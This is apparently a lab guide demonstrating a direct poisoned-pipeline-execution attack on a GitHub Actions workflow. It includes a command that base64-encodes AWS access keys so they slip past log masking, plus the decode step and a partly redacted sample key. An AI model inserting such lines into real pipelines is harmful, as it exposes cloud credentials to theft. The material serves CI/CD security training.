# CI CD Risks - Pipeline Poisoning Attack Lab

## Prep
1. Within AWS Account, create Amazon Elastic Container Registry named `cicd-sec`
1. Add Github Repository Secrets 
    1. `AWS_ACCESS_KEY_ID`
    1. `AWS_REGION`
    1. `AWS_SECRET_ACCESS_KEY`
    1. `REPO_NAME`
    1. `ECR_REGISTRY`
1. Ensure Branch Protection is disabled within GitHub Repository


## Execute Direct-PPE 

Add line of code to extract `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` during Pipeline execution after `make build`

```
echo "accesskey: ${{ env.AWS_ACCESS_KEY_ID }}  secretkey: ${{ secrets.AWS_SECRET_ACCESS_KEY }}" | base64
```

Extract Output from GitHub Workflow Output and 

```
echo "<ENCODED_SECRETS>" | base64 -d
```

example output
```
echo "YWNjZXNza2V5OiBBS0xxxxXSEpCQzRYTlNKRSAgc2VjcmV0a2V5OiBBYmJYd1pxd2tMeExmZxxxxQUkhOdU1aR0lkd3d2QjcrRFBpCg==" | base64 -d
accesskey: AKIA2INxxxxx4XNSJE  secretkey: AbbXwZqwkLxLfgfSxxxxxGIdwwvB7+DPi
```